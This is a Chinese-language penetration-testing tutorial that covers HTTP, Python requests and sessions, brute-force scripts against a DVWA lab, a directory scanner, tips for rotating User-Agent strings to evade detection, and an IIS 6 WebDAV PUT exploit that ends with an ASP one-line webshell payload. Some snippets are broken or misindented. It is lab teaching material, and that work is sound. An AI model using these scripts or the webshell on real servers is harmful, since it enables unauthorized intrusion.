在请求⽅法中介绍了HTTP1.0和HTTP1.1当中的请求⽅法，对于HTTPS中的请求⽅法来说，它也包含了HTTP1.1的

所有⽅法。在介绍HTTP1.1的请求⽅法时，就可以拓展到HTTPS中来使⽤。

##### （1）HTTP1.0

在HTTP1.0中，它只⽀持三中请求⽅法：GET、POST、HEAD。这三种⽅法主要都是⽤来进⾏请求，当然，这个请

求都是⼀个简单请求，⽤来获取⽬标资源。这样的⼀个协议⽅法是⾮常简单的，为了使得HTTP协议具有更加强⼤

的功能，在HTTP1.0的基础上开发的HTTP1.1协议，⽀持了更多的⽅法。

##### （2）HTTP1.1

在HTTP1.1协议中新增了：OPTIONS, PUT, DELETE, TRACE, CONNECT, PATCH⽅法，最显著的是新增了⽂件的上传PUT和删除DELETE⽅法，使得HTTP协议更加强⼤。

说到请求，就需要请求具体的⼀个⽬标，这个⽬标⼀般情况下是对应的URL（统⼀资源定位符），下⾯了解⼀下统⼀资源定位符的格式。

#### **3.URL**

⾸先，这⾥给出⼀个很具体的例⼦：

> 协议://主机名.域名/⽂件夹/⽂件?参数=值&参数1=值1

⾸先是协议，协议可以是HTTP、HTTPS或者是FTP都可以。之后冒号两个斜杠，接下来是主机名，这⾥主机名⼀定要注意，经常⻅到主机名是www，当然也有⼀些⽹站是edu或是别的，主机名更多情况下加上域名是被称为⼦域名，也就是⼀个域名下有多个分站。

域名之后是对应的⽂件夹，也就是资源⽬录。⽹站其实就是⼀个⽂件夹，它下⾯还有⽂件夹或者⽂件，那么访问到达⽂件后，需要对⽂件传递参数，直接⽤问号然后是参数等于值。如果还需要传递第⼆个参数，使⽤&连接。当然，参数要根据实际情况加或者不加。

以上是关于请求⽅法和URL介绍，有了请求⽅法，还需要在请求过程中加⼊⼀些HTTP请求头。

#### 4.HTTP请求头

在HTTP请求头中，最为常⽤的参数有如下⼏个：

> user-agent, accept-encoding, referer, cookie, location, set-cookie, www-authenticate

- `User-agent`顾名思义就是⽤户客户端或者是⽤户代理，这个代理和HTTP代理是不同的，它主要是指浏览器，那么这个头参数携带的内容就是当前浏览器的版本信息。
- `accept-encoding`表示浏览器接受的编码
- `Referer`头参数不⼀定需要携带，它主要是⽤来表示当前⽹⻚是从哪⾥跳转过来的，表示它的上级⻚⾯。
- `Cookie`是可能含有重要或机密信息的头参数，它其中包含的就是cookie信息。
- `location`表示当前链接要跳转到哪⾥。
- `set-cookie`表示设置cookie信息，这⾥set-cookie不是HTTP请求头，⽽是响应头。它表示服务端给客户端（浏览器）响应过程中设置的cookie信息，使⽤set-cookie设置，它是⼀个HTTP响应头。
- `www-authenticate`表示HTTP认证信息，主要⽤于身份验证HTTP basic等。

以上是关于HTTP请求头的介绍。

#### **5.HTTP****响应状态码**

⽤户请求之后等到响应，响应之后客户端通过得到的响应状态码，很直观的看到当前响应是否成功，或者出现了什么问题。

下⾯给出⼀些响应概括性的内容：1xx、2xx、3xx、4xx、5xx

x是代表某个数字，1xx代表100以后得所有数字。

- `1xx`状态码的具体含义是表示信息提示，⽤来提示浏览器或者是对应的⽤户究竟出现了怎样的⼀个信息提示
- `2xx`状态码代表客户端请求得到了服务器的响应，成功的⼀次访问
- `3xx`状态码表示重定向，可能在访问⼀个⽹⻚时，这个⽹⻚可能删除或者不再使⽤了，那么程序员在后端设置了⼀个重定向，这时候客户端会收到3xx重定向，接着客户端跟着3xx重定向跳转到其他的可以使⽤的⻚⾯

- 4xx状态码表示客户端错误，经常⻅到404，它表示请求的URL不存在，那么，这个请求错误的本质就是客户端错误了。客户端发送了⼀个不存在的请求，使得服务器返回4xx
- 5xx状态码表示服务端错误，除了客户端请求错误外，有时候也会有服务端出现错误

以上是对于HTTP协议进⾏了简单介绍，并且对最常⽤的功能进⾏了说明，下⾯就来查看HTTP，从直观上查看⼀下

对应的请求和响应的数据包。

#### **6.查看HTTP**

接下来要使⽤浏览器的审查（检查）⼯具，来进⾏查看

打开浏览器，之后按F12，或者点击⿏标右键，选择检查

打开⼯作区之后，点击标签栏⽹络，然后刷新当前⻚⾯，那么可以看到返回了很多内容。

点击其中的⼀个内容查看，⾸先可以看到它的请求和响应。

在这⾥有request URL，以及它的请求⽅式为GET的这样⼀个概括性内容。

可以看到请求的状态码为200，以及远程的⽬标服务器地址和端⼝号，可以看到使⽤的是443端⼝，那么它的HTTP协议是HTTPS。

下⾯也给出了其他响应头

那么，我们通过检查⼯具进⾏查看，当然，也可以通过Burpsuite HTTP截断代理进⾏查看，这些⼯具和浏览器的检

查⼯具最⼤的区别就在于可以修改某⼀个请求，以及删除响应当中的内容，不让他显示到浏览器中。

以上就是关于HTTP协议的介绍，看到这⾥，可能对HTTP协议有了简单认识，那么，下⾯将会⽤Python与HTTP协

议进⾏交互，更加直观以及从编程的⻆度看待HTTP协议，加强认识，从细节上了解HTTP协议。

### **⼆、Python-HTTP请求**

本节内容介绍Python-HTTP请求的编写，了解HTTP当中，GET请求使⽤Python的编写，以及POST请求使⽤

Python来编写，同时也可以使⽤Python来⾃定义HTTP请求当中的某些请求头，来发送请求。

当然，除了GET和POST，还可以发送其他的请求。

#### **1.GET请求**

⾸先介绍GET请求。

对于GET请求来说，可以将GET请求分为两类请求，分别是不带参数请求和带参数请求。在这⾥给出简单的代码

```python
requests.get(url)
requests.get(url=url, params={"key1": "value1", "key2": "value2"})
```

不带参数请求可以直接使⽤`requests.get`对应URL来进⾏请求。

带参数请求，就需要设置params参数，使⽤⼀个字典来表示参数内容，key1表示参数名称，value1表示参数值，

多个参数⽤逗号分隔。

那么，在这个过程中，可以使⽤对应requests.get返回response对象的url属性来获取请求的完整URL（resp.url）。

下⾯分别对**带参数**和**不带参数**的GET请求进⾏**演示**

```python
#不带参数的GET请求
import requests

url = "http://httpbin.org"
resp = requests.get(url)
resp = requests.get(url=url)
print(resp.url)
```



```python
#带参数的GET请求
import requests
url = "http://192.168.3.67/brute/brute_low_post.php"

# ⾸先创建⼀个字段，⽤来保存要传递的参数
payload = {"username": "admin", "password": "admin", "submit": "登录"}
resp = requests.get(url=url, params=payload)
print(resp.status_code)
print(resp.url)

result = resp.text

if result.find("success") >= 0:
	print("admin:admin" + "successful")
else:
	print("error")
```

下⾯演示带参数的GET请求

```python
import requests
# http://127.0.0.1/dvwa/vulnerabilities/brute/?username=123&password=123&Login=Login#
url = 'http://127.0.0.1/dvwa/vulnerabilities/brute/'

headers = {
"cookie": "security=low; PHPSESSID=1mlccdnk56brvv3ag49vt9jbpe"
}

payload = {"username": "123", "password": "123", "Login": "Login"}
resp = requests.get(url=url, params=payload, headers=headers)

print(resp.request.url)
print(resp.text)
result = resp.text

if result.find("Username and/or password incorrect") >= 0:
	print("密码错误")
else:
	print("密码正确")
```

##### 练习：GET请求dvwa的暴力破解靶场

```python
import requests
username = admin
password = password

url = f"http://192.168.70.10:8085/vulnerabilities/brute/?username={username}&password={password}&Login=Login#"
headers = {
'Cookie': 'PHPSESSID=dmgrh3319ggtanru8fl8ifsp91;security=low'
}
resp = requests.get(url=url, headers=headers)
if resp.status_code == 200 or resp.status_code == 201:
    if "Welcome to the password protected area admin" in resp.text:
        print("登录成功！")
    else:
        print("登录失败。")
    else:
        print(f"请求失败，状态码：{resp.status_code}")
print(resp.url)
```

以上是GET请求使⽤Python编写，同样在登录⽅⾯除了GET请求⽤的更多的是POST请求。

#### **2.POST请求**

POST请求分为带参数的和不带参数的，在Python requests库中，不带参数的POST请求使⽤`requests.post(url)`，

带参数的POST请求使⽤`requests.post(url, data={key1: value1})`。

针对POST⽅式的提交请求，⼀般情况下都是带有参数的。下⾯主要演示带参数的POST请求，同样，这⾥将以⾃⼰电脑靶场作为演示。

```python
#args_post.py
import requests
url = "http://127.0.0.1/brute/brute_low_post.php"
payload = {"name": "123", "password": "123"}
resp = requests.post(url, data=payload)
print(resp.status_code)
print(type(resp.text))
print(resp.text)
if resp.text.find("登陆成功") >= 0:
	print("登陆成功")
else:
	print("登录失败")
```

##### 练习:POST请求登录dvwa靶场

```python
import requests

url = "http://192.168.70.10:8085/login.php"
data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': ''
}
resp = requests.post(url=url, data=data)

if resp.status_code == 200 or resp.status_code == 201:
    if "Welcome to Damn Vulnerable Web Application!" in resp.text:
        print("登录成功！")
    else:
    	print("登录失败。")
else:
    print(f"请求失败，状态码：{resp.status_code}")

print(resp.text)
```

以上，就是通过Python完成了GET请求和POST请求，在这个过程中，都是使⽤的默认HTTP请求头，在某些特殊情况下，可能需要⾃定义请求头。

#### **3.⾃定义请求头**

例如，在做爬⾍的时候，会⾃定义user-agent和cookies请求头参数，来伪装⽤户正常访问⾏为。

再⽐如，当前站点只允许哈哈浏览器访问，⽽不允许其他浏览器访问，那么这时候就需要修改user-agent请求头来进⾏访问。

对于Python来说，可以⾃定义http请求头来进⾏HTTP请求的发送，使⽤requests库的headers⽅法进⾏配置发送。这⾥我们将以requests的get⽅法进⾏测试

```python
#define_headers.py
import requests
url = "http://127.0.0.1/dvwa/vulnerabilities/brute/"
headers = {
    "User-Agent": "HAHA",
    "PHPSESSID": "1mlccdnk56brvv3ag49vt9jbpe"
}
resp = requests.get(url, headers=headers)
print(resp.request.headers)

# 查看默认的请求头
resp1 = requests.get(url)
print(resp1.request.headers)
```

以上演示了get请求⽅式的⾃定义请求头，POST请求⽅式也有⾃定义修改headers请求头的⽅法，

**4.****其他请求**

Python可以发送get请求和POST请求外，也可以发送其他请求。

例如可以发送`PUT, DELETE, HEAD, OPTIONS`等

```python
r = requests.put("http://httpbin.org/put", data={"key1": "value1"})
r = requests.delete("http://httpbin.org/delete")
r = requests.head("http://httpbin.org/get")
r = requests.options("http://httpbin.org/get")
```

### **三、Python-HTTP响应**

本节内容将介绍在Python当中，对于HTTP协议响应的编程。

#### **1.获取响应状态码**

在HTTP协议的响应过程中，最能表明协议的响应结果，就是通过响应状态码可以直接查看到对应⽹⻚的状态。

在Python中，也可以使⽤返回的HTTP响应对象，然后通过status_code属性来获取对应的状态码。

下⾯将在“http://127.0.0.1/dvwa/vulnerabilities/brute/”这个URL进⾏实验

#### **2.获取响应⽂本**

除了获取状态码，其实浏览器在得到响应之后，是显示对应的响应⽂本，在Python中可以使⽤以下两个⽅式来获取对应的⽂本，分别是content和text来进⾏获取。下⾯通过实践操作查看两者的区别。

```python
#content_text.py
import requests
url = "http://192.168.3.47/dvwa/vulnerabilities/brute/"
resp = requests.get(url)
print(resp.text)
print("*"*100)
print(resp.content)
```

对应的content输出了⼀个⼆进制的内容，在这⾥它既有了换⾏符`\n`也有空格符`\r`。

⽽在text输出了原⽹⻚代码，它和浏览器中的代码是相同的。

如果运⾏程序后，返回结果中有乱码，是因为咱们在输出过程中没有对它进⾏转码，使⽤text.decode("utf-8")进⾏转码。

由此可知，text返回的是源代码，⽽content是返回对应的⼆进制数据，包含对应的换⾏和空格符。

以上是通过Python获取HTTP的响应⽂本，其实也可以通过Python获取HTTP协议响应的报⽂头。

我们可以通过requests库中请求URL后返回对象的headers属性来获取。

```python
#resp_header.py
import requests
url = "http://192.168.3.47/dvwa/vulnerabilities/brute/"
resp = requests.get(url)
print(resp.headers)
print(resp.request.headers)
```

这⾥只是获取了响应头，更多情况下，有可能也需要获取响应对应的请求头，可以使⽤resp.request.headers来进⾏获取。

这时候就可以获取到对应的请求头，可以看到，响应头和请求头之间就差了⼀个request⽅法。

#### **3.**获取请求URL

在某些请求时候，也需要获取当前的请求URL。可以通过resp.url响应对象的url⽅法来获取发送请求的URL。

```python
#req_url.py
import requests
url = "http://192.168.3.47/dvwa/vulnerabilities/brute/"
resp = requests.get(url)
print(resp.url)
print(resp.request.url)
```

#### **4.获取cookie**

在某些情况下，⽹站的功能越复杂，就需要更多的验证机制。⽐如获取cookie，对于cookie来说，Python也提供了

对应的属性来进⾏获取。可以使⽤requests库请求url返回对象的cookie属性，获取服务器给咱们设置的cookie。

```python
#resp_cookie.py
import requests
url = "https://www.baidu.com"
resp = requests.get(url)
print(resp.cookies)
```

以上就是关于Python获取HTTP响应编程的⼀些常⽤属性，当然还有⼀些其他的属性，相⽐于这些属性来说是不常

⽤的。在后⾯编程的过程中，如果使⽤到本节内容不包含的属性，可以再来着重介绍。

### **四、Python-HTTP代理**

本节内容将认识使⽤Python与Burpsuite进⾏交互，主要与对应的HTTP代理截断进⾏交互，对于要使⽤Python与

对应代理来进⾏交互，需要考虑以下⼏个⽅⾯，分别是：代理设置、参数设置、结合Burpsuite查看。

#### **1.**代理设置

⾸先是代理的设置，代理设置要设置对应的客户端与服务器端进⾏交互的协议。交互过程中可能使⽤到HTTP或者

是HTTPS，这时候设置代理要设置两项内容，分别是HTTP和HTTPS，设置完成之后，对应的要在requests当中也

需要设置对应的参数。

#### **2.**参数设置

参数设置这⾥需要设置`proxies`和`verify=False`这两个参数。

proxies是设置代理，针对HTTPS的代理设置，需要验证证书的合法性，为了避免证书验证导致的错误，可以让verify参数等于False，从⽽不进⾏证书合法性验证。

#### **3.结合Burpsuite查看**

```python
#proxy_python.py
import requests
url = "https://www.baidu.com"
# 代理服务ip 192.168.3.50
proxies = {"http": "http://192.168.3.50:8080", "https": "http://192.168.3.50:8080"}
resp = requests.get(url, proxies=proxies, verify=False)
print(resp.status_code)
```

### **五、Python-HTTP会话编程**

#### **1.携带cookie的会话**

说到Python的会话编程，可以这样来理解，会话表示，客户端浏览器与服务端建⽴⼀次连接，接下来通过⼀个会话连接，不断的进⾏访问，不会重新建⽴对应的连接，当浏览器关闭时，对应的会话连接才会中断，结束对应的会话。这样的会话经常⽤于携带cookie的会话。

cookie在很多情况下是⽤于身份验证。⽐如说，⽤户访问某些⻚⾯时，例如登录⻚⾯，这时候⽤户登录成功后，服务器就会使⽤HTTP响应头set-cookie来设置cookie值到客户端，当客户端下⼀次访问对应的⻚⾯时，就会⾃动添加设置好的cookie值来进⾏身份验证，从⽽确定合法的身份，以便继续访问其他在后⾯保护的⻚⾯内容，保护⻚⾯就是需要登录才能访问到的⻚⾯。这时候就在每⼀个需要合法身份访问⻚⾯的位置来添加⼀个⽤户信息。登录验证的⻚⾯只需要验证对应的cookie值即可完成对应的防御与保护。

#### **2.Python-session**

对于这种情况，Python中也提供了session类来进⾏对应的模拟。

可以通过requests来调⽤Session类并保存到变量s中，之后就可以使⽤s.get()或者是post等等⼀些请求⽅式，去访问url。

下⾯演示的内容是获取⽹站的cookie，在下次访问过程中依然⾃动携带这个cookie来进⾏访问。

```python
#requests_session.py
import requests
url = "https://www.baidu.com"
s = requests.Session()
resp = s.get(url)
print(resp.cookies)
print(resp.request.headers)
# 验证
resp1 = s.get(url)
print(resp1.request.headers)
```

这时候可以看到它的cookie，但是在它的请求报⽂头中，并没有携带我们设置的cookie值，这是由于在请求之后，

baidu会返回对应的cookie值“`Cookie BDORZ=27315 for .baidu.com`”。

在下次使⽤当前会话进⾏这个url时候，才会将对应的cookie携带到对应的HTTP请求当中，那么这时候再调⽤

`resp.request.headers`就可以输出对应的**请求头**，那么这个请求头就包含了对应cookie值。

#### 练习

```python
import requests
import re


def login(session, url, payload, headers):
    """发送POST登录请求。"""
    response = session.post(url=url, data=payload, headers=headers)
    return response


def get_security_page(session, security_url):
    """获取安全页面的内容。"""
    response = session.get(url=security_url)
    return response.text


def extract_user_token(html_content):
    """从HTML内容中提取用户令牌。"""
    pattern = r"'user_token' value='(.*?)'"
    match = re.search(pattern, html_content)
    if match:
        return match.group(1)
    return None


def brute_force_login(session, brute_force_url, payload):
    """发送暴力登录的POST请求并检查成功。"""
    response = session.post(url=brute_force_url, data=payload)
    if "Welcome to the password protected area" in response.text:
        print("暴力破解页面登录成功")
    else:
        print("登录失败")
    return response


def main():
    session = requests.Session()

    login_url = "http://192.168.70.10:8085/login.php"
    login_payload = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': ''
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36'
    }
    proxies = {
        "http": "http://{}".format(requests.get("http://proxy.201068.xyz:5010/get/?type=http").json().get('proxy'))
    }
    print("打印代理：",proxies)

    #登录
    login_response = login(session, login_url, login_payload, headers)
    print("打印登录页面的请求url：",login_response.request.url)

    # Get Security 页面
    security_url = "http://192.168.70.10:8085/security.php"
    security_page_content = get_security_page(session, security_url)

    # 获取用户token
    user_token = extract_user_token(security_page_content)
    print("获取用户token：",user_token)

    # 登录暴力破解
    brute_force_url = "http://192.168.70.10:8085/vulnerabilities/brute/"
    brute_force_payload = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    }
    brute_force_response = brute_force_login(session, brute_force_url, brute_force_payload)
    print("打印暴力破解页面的请求headers：",brute_force_response.request.headers)
    print("打印暴力破解页面的请求url：",brute_force_response.request.url)


if __name__ == "__main__":
    main()

```



### **六、Python⽬录扫描⼯具**

下⾯将介绍使⽤Python以及之前学过的对应知识编写⼀个⽬录扫描⼯具。要编写这样⼀个⼯具，⾸先就要明⽩这样⼀个⼯具的内在原理。

#### **1.**⽬录扫描原理

⾸先⽬录扫描同样是基于字典的⼀种暴⼒破解。

1. （1）⾸先要读取字典⽂件，然后将对应的URL进⾏拼接，拼接成最终要发送HTTP请求的⼀个url。
2. （2）接下来，使⽤HTTP get请求对应的url，请求之后，服务器会返回对应的响应状态码。
3. （3）然后，这时候判断是否得到了200的状态码，如果得到200状态码，表明这个⽬录是存在的，可以直接输出对应⽬录。状态码是404，那么表明，当前的⻚⾯是不存在的，或者是这个⽬录不存在。

#### **2.字典⽂件读取**

⽬录扫描⾸先要读取字典⽂件，读取字典⽂件使⽤的是Python当中⽂件的操作，下⾯介绍字典⽂件的读取。

```python
with open("dir.txt", "r") as f
```

使⽤`with open("filename.txt", "r") as f`:使⽤r读模式来读取⽂件，然后⽤f变量来保存读出的内容，

也可以`f =open("filename.txt", "r")`，之所以使⽤with as这样的结构，是因为⽂件流打开之后需要close，需要关闭，如果使⽤with的话，在结束with的语句块之后，⽂件流就⾃动关闭了。

打开⽂件流之后，可以使⽤⼀下三种⽅式来读取对应的字典⽂件:

- `f.readline()`，这⾥readline表示每次**读取⼀⾏**
- `f.readlines()`，readlines表示**全部读取**出来，放到对应的列表中
- `f.read(10)`，read表示读取⼏个字节，需要在它的参数中设置对应的字节

下⾯进⾏演示，这⾥将dir.txt⽂件为例，接下来读取它的内容

```python
#file_open.py
with open("dir.txt", "r") as f:
	for line in f.readlines():
	print(line.strip())
```

以上是咱们使⽤readlines进⾏读取，也可以使⽤readline和read，那在读取完之后，不需要我们使⽤f.close()关闭⽂件流

#### **3.⼯具编写**

有了⽂件读取内容之后，还需要结合咱们之前介绍的Python与HTTP交互，来进⾏对应的⼯具编写。

```python
#scan_dir.py
import time
import sys
import requests
url = "http://127.0.0.1/"
# 解决程序执⾏过快，导致⽹络阻塞
flag = 0
with open("dir.txt", "r") as f:
	for line in f.readlines():
    	line = line.strip()
        # 这时候发送请求，和HTTP交互
        resp = requests.get(url + line)
        #print(resp.url)
        if resp.status_code == 200:
            print("url: %s exist" % resp.url)
        flag = flag + 1
        if flag == 200:
            time.sleep(3)
            flag = 0
```

出现扫描结果后，我们随机打开⼀个URL，可以浏览到当前⽬录下的所有⽂件，那也表明咱们扫描到的⽬录是存在的。

那么接下来，需要进⾏⼀个参数的优化。

#### **4.参数优化**

刚才的程序中，只是固定了对应的url进⾏探测，这时候可以修改对应的内容，使得程序更加的强⼤，探测更多的URL。

不需要在代码中修改，只需要在命令⾏进⾏传递即可。

可以使⽤sys库，在命令⾏中来对Python脚本传递参数

```python
#scan_dir.py
import time
import sys
import requests
# url = "http://127.0.0.1/"
# python3 scan_dir.py http://127.0.0.1/
url = sys.argv[1]
# 字典⽂件也可以通过外部参数传递
# dic = sys.argv[2]
# 解决程序执⾏过快，导致⽹络阻塞
flag = 0
with open("dir.txt", "r") as f:
	for line in f.readlines():
    line = line.strip()
    # 这时候发送请求，和HTTP交互
    resp = requests.get(url + line)
    #print(resp.url)
    if resp.status_code == 200:
    	print("url: %s exist" % resp.url)
    flag = flag + 1
    if flag == 200:
      time.sleep(3)
      flag = 0
```

以上就是关于对应的参数优化，可以⾃定义url来进⾏对应的探测。避免只能扫描单⼀URL，或者是只能在代码当中修改，才能继续执⾏，这样就可以不修改代码，直接执⾏针对于某个URL进⾏⽬录扫描。

当然，也可以对字典⽂件进⾏⼀个优化，同样使⽤命令⾏进⾏执⾏。

以上完成了Python对⽬录扫描⼯具的编写，这⾥没有加⼊多线程，可以根据实际情况加⼊多线程，来加快探测的速度。同时加⼊更多的功能模块，拓展Python的⽬录扫描⼯具，这⾥只是介绍⼀个简单的⽬录扫描⼯具。



#### 练习

```python
import requests

with open("dic.txt", "r",encoding="utf-8") as f:
	for lines in f.readlines():
		line = lines.strip()
		url ="https://www.baidu.com/" + line
		try:
			resp = requests.get(url,timeout=3)
			if resp.status_code == 200:
				print("%s 当前URL存在：" % resp.url)
		except Exception as e:
			continue
```



### **七、Python⽬录扫描⼯具基础补充**

#### **1.命令⾏Python参数传递**

⾸先命令⾏当中执⾏Python⽂件时，对**参数传递**进⾏解释。

在之前，⽬录⼯具使⽤sys.argv的索引来进⾏对应参数的访问，得到对应的参数再进⾏执⾏，从1开始表示得到第⼀个参数，第⼆个索引是得到第⼆个参数，那我们可能会有疑问，Python的索引下标是从0开始，当前的参数传递

`sys.argv[0]`代表着什么？`sys.argv[1]`代表着什么？他们之间有什么区别？

```python
#sys_demo.py
import sys
print("下标为0的参数：%s" % sys.argv[0])
print("下标为1的参数：%s" % sys.argv[1])
```

这⾥，⾸先输出argv0对应的内容，是当前Python⽂件的绝对路径，由此看到，sys.argv[0]代表的是当前⽂件。

其次，输出argv1对应的内容，是传递的第⼀个参数，这就是argv在传递参数时，为什么从1开始的含义。

#### **2.⽂件读写补充**

在之前，编写⽬录扫描⼯具当中也使⽤了对应的⽂件读写，来读取对应的字典⽂件，下⾯将对⽂件读写进⾏补充。

之前直接使⽤`with open(filename, mode)`然后as f进⾏读取，这个在代码中可以看到。

```python
with open("dir.txt", "r") as f
```

这⾥，r代表read，表示读取⽂件，open函数在默认情况下，打开⽂件是以只读的模式打开的，可以直接读取⽂件。

```python
#open_file_demo.py
f = open("dir.txt")
t = f.read(20)
print(t)
f.close()
```

那么，其实mode还有其他模式，r是它默认的模式，还有w，表示写，我们就可以向⽂件当中写⼀些内容进去。当然，写是直接覆盖原有内容，下⾯进⾏对应的写操作.

```python
f1 = open("test.txt", "w")
f1.write("brute")
f1.close()
f2 = open("test.txt")
t = f2.readline()
print(t)
f2.close()
```

如果想单纯的在⽂件中追加内容，不覆盖原有内容，这时候就可以使⽤a模式，也就是append来执⾏。它直接在⽂件末尾添加对应的内容，⽽不会将原有的内容进⾏覆盖。

```python
f3 = open("test.txt", "a")
f3.write("hello\n")
f3.writelines(["nihao\n", "world\n"])
f3.close()
f4 = open("test.txt")
for line in f4.readlines():
	print(line.strip())
f4.close()
```

#### **3.**⾃定义User-agent

在⽬录扫描⼯具中可以看到，默认情况下，使⽤Python进⾏HTTP请求时，会携带HTTP请求的user-agent，

Python requests对应库的版本这时候很容易被发现，就是服务器中的⽇志会看到⼤量的Python requests库发送的⼤量请求，它是在user-agent中出现，很容易的被管理员发现是⼀个⾮⽤户正常状态下的⼀个请求。这时候就会引发对应的限制预案，使得当前的访问被终⽌，从⽽触发它的安全机制，导致这种扫描⾏为不被接受并被拒绝，那么，我们也可以在Python中进⾏实验。

```python
#user_agent_test.py
import requests
url = "http://www.baidu.com"
resp = requests.get(url)
print(resp.request.headers)
```

可以在对应的请求过程中，⾃定义user-agent，避免HTTP请求的时候带上Python⾃带的user-agent。

这时候要获取合法的user-agent，可以在互联⽹上进⾏搜索，也可以在浏览器中进⾏查找。

随便打开⼀个⽹⻚，⿏标右键选择审查⼯具或者检查，打开之后点击⽹络或network，找到其中的⼀个请求。在请求头部分找到user-agent，将它复制出来，这时候他就是⼀个合法的user-agent。可以在代码中使⽤这个来⾃定义user-agent。

> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

```python
#user_agent_test.py
import requests
url = "http://www.baidu.com"
headers = {
"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
}
resp = requests.get(url, headers=headers)
print(resp.request.headers)
```

运⾏程序后，可以看到，请求头部分的user-agent就已经被替换成了⾃定义的内容。

当然，也可以设置其他的HTTP请求头。实际情况中，因为在⽬录扫描过程中，有很多请求会发送，只使⽤⼀种

user-agent很可能也会触发对应的安全机制，这时候就可以设置对应的headers有多个user-agent，也就是在

headers字典的user-agent key上进⾏循环遍历，每次进⾏赋值，当循环执⾏达到⼀定数量，就换下⼀个user

agent，从⽽避免触发安全机制。

由此思考到，在⽇常审查⽇志时，发现当前的user-agent⼤量为同样⼀个，并且不合法的，⽐如是Python对应的默

认user-agent时，那么这时候就可以确定对应的user-agent使⽤了对应⽬录⽬录扫描或者其他⼤量密集型请求操作

这样的异常⾏为。要时刻关注这样的⾏为，避免它进⾏⼀些⾮法操作。

### **⼋、Python IIS PUT漏洞POC⼯具**

#### **1.**漏洞原理

要编写漏洞对应的检测⼯具，⾸先要明⽩漏洞的原理。为什么现在有着⾮常成熟的漏洞⼯具，还要编写对应的漏洞检测⼯具，这是由于某些漏洞在被披露之后，⽹络上是没有对应的检测⼯具，以及成熟的扫描⼯具，没有集成对应的漏洞扫描模块，这时候就需要根据对应的漏洞原理写出对应的**POC（[为观点提供证据]概念性验证）**代码，⽤于测试验证当前⽹络环境中的某些机器，是否存在对应的漏洞。当然这样的检测必须是在被授权，或者是在企业内部进⾏探测，以确保内部⽹络的安全性。切勿使⽤对应的POC来对某些服务器进⾏测试，这样是违法的，我们⼀定要维护⽹络的安全。

下⾯使⽤Python来编写⼀个IIS PUT漏洞的POC⼯具，最后通过上传⼀句⽊⻢代码，获得webshell权限。

基础环境搭建和漏洞复现参照⽂档《IIS6.0写权限漏洞复现获取WebShell》。

#### **2.**⼯具原理

IIS PUT漏洞是由于IIS中间件服务器当中的拓展⼯具WebDAV被开启，在webdav当中⽀持⼀些HTTP⽅法，也提供了⼀些HTTP原有不存在的⼀些功能更加强⼤的⽅法（⽐如说，Move），使得服务器开启了webdav之后，就可以与原本HTTP⽅法PUT与MOVE来进⾏结合，从⽽以达到直接上传任意⽂件的效果。

这时候我们就可以上传⽂件，⽐如说上传⼀个1.asp，asp⽂件当中存储的内容是webshell，我们就可以利⽤IIS PUT直接上传，达到获得webshell的效果。

对于这样的漏洞该如何进⾏探测，在HTTP请求⽅法中提供了OPTIONS⽅法，可以列举出⽬标服务器所⽀持的HTTP⽅法，同时也包含拓展⼯具所⽀持的HTTP⽅法。那我们就可以利⽤HTTP options⽅法进⾏测试。

#### **3.**编写POC

下⾯根据这样的原理，来进⾏对应的⼯具编写。

1. （1）确定⽬标服务器
2. （2）发送options请求
3. （3）确定结果中是否具有MOVE、PUT

例如⽬标的服务器是192.168.70.6，接下来就可以使⽤HTTP⽅法中的options请求⽅法向⽬标服务器发送，以获得结果当中所⽀持的HTTP⽅法。

下⾯，进⾏代码编写

```python
import requests
target_ip = "192.168.3.115"
url = "http://"+target_ip
resp = requests.get(url)
print(resp.headers)
server_type = resp.headers['Server']
# ⾸先确定⽬标服务器IIS的版本Microsoft-IIS/6.0
print(server_type)
```

要确定它是否存在IIS PUT漏洞，就是要确定的是结果当中所⽀持的⽅法是否具有MOVE和PUT，那么只有具有这两种⽅法时才能确定存在IIS PUT漏洞。

执⾏上⾯的代码，在运⾏结果中可以看到，在public 以及Allow key下，Allow是原本HTTP所⽀持的⽅法。public表示对应webDAV所⽀持的⽅法，在webDAV开启之后，⽀持更多的HTTP⽅法，在结果中可以发现，有PUT以及MOVE。那我们⾁眼查看的话是很费劲的，这时候可以使⽤if来判断，从⽽获得当前内容是否具有PUT和MOVE。

```python
import requests
url = 'http://192.168.3.53'
resp = requests.options(url)
# print(resp.headers)
# print(resp.headers['Allow'])
# print(resp.headers['Public'])
result = resp.headers['Public']
print(type(result))
if result.find("PUT") >= 0 and result.find("MOVE") >=0:
	print(result)
	print("exist IIS PUT and MOVE vul")
else:
	print("not exist")import requests
target_ip = "192.168.3.115"
url = "http://"+target_ip

resp = requests.get(url)
# print(resp.headers)
server_type = resp.headers['Server']
# ⾸先确定⽬标服务器IIS的版本Microsoft-IIS/6.0
print(server_type)
# 使⽤options⽅法，获取⽬标服务器都⽀持哪些HTTP请求⽅式，主要确定是否包含PUT和MOVE
resp = requests.options(url)
allow_item = resp.headers['Allow']
public_item = resp.headers['Public']
if (allow_item.find("MOVE") != -1 and allow_item.find("PUT") != -1) or (public_item.find("MOVE") and public_item.find("PUT")):
	print(server_type + ": 存在写权限漏洞")
```

#### **4.利⽤漏洞**

前⾯探测到⽬标服务器允许PUT和MOVE请求⽅法，那么下⾯我们使⽤PUT⽅发向⽬的服务器上传⽊⻢代码。

伪造请求headers

```python
# 构造请求头，定义的Host是假IP
headers = {
"Host": "219.153.49.228:43068",
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 
Firefox/56.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
"Accept-Encoding": "gzip, deflate",
"Connection": "close",
"Content-Length": "25"
}
```

请求的payload

```python
# 上传⼀句话⽊⻢
data = '<% eval request("mima") %>'
```

